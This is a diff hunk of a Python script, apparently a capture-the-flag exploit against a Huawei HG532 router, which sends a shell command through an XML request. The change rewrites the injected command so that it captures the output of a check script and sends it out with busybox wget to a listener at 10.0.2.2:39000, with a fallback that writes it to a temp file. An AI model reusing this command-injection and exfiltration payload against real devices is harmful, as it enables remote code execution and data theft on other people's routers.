@@ -6,7 +6,12 @@ import requests
 from requests.auth import HTTPDigestAuth
 
 HEADERS = {'Content-Type': 'text/xml; charset="utf-8"'}
-DEFAULT_CMD = "echo HG532_CACHE_OK >/tmp/ctf.cache;/bin/check_cache.sh >/tmp/flag_out"
+DEFAULT_CMD = (
+    "echo HG532_CACHE_OK >/tmp/ctf.cache;"
+    "flag=$(/bin/check_cache.sh);"
+    "/bin/busybox wget -qO- \"http://10.0.2.2:39000/${flag}\" >/dev/null 2>&1 || "
+    "echo \"$flag\" >/tmp/flag_out"
+)
 
 session = requests.Session()
 session.trust_env = False
